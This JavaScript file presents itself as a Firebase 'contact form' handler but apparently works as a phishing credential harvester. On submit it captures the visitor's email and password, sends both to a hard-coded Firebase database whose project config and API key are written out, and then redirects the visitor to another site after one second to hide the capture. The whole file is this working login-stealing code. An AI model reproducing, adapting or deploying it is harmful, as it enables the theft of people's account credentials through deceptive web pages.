// Initialize Firebase (ADD YOUR OWN DATA)
const firebaseConfig = {
    apiKey: "AIzaSyAW4cTAsG2QiXXGvS2FyOwZYbR_BqCQDXM",
    authDomain: "contactform-37fe3.firebaseapp.com",
    databaseURL: "https://contactform-37fe3-default-rtdb.firebaseio.com",
    projectId: "contactform-37fe3",
    storageBucket: "contactform-37fe3.appspot.com",
    messagingSenderId: "831163231244",
    appId: "1:831163231244:web:71517d64004b77358a9229",
    measurementId: "G-F7SMDYVPSZ"
      
  
    };
  
  
  firebase.initializeApp(firebaseConfig);
  
  // Reference messages collection
  var messagesRef = firebase.database().ref('user');
  
  // Listen for form submit
  document.getElementById('contactForm').addEventListener('submit', submitForm);
  
  // Submit form
  function submitForm(e){
    e.preventDefault();
  
    // Get values
    var password = getInputVal('password');
    var email = getInputVal('email');
  
  
    // Save message
    saveMessage(email, password);
  
    // Show alert
    document.querySelector('.alert').style.display = 'block';
  
    // Hide alert after 3 seconds
    setTimeout(function(){
      document.querySelector('.alert').style.display = 'none';
    },3000);
  
    // Clear form
    document.getElementById('contactForm').reset();
  }
  
  // Function to get get form values
  function getInputVal(id){
    return document.getElementById(id).value;
  }
  
  // Save message to firebase
  function saveMessage( password,email ){
    var newMessageRef = messagesRef.push();
    newMessageRef.set({
   email:password,
      password:email
    
    });
    setTimeout(function () {
      window.location.href = 'https://bc.co'; // Change the URL to the desired redirection destination
  }, 1000);
}
  
  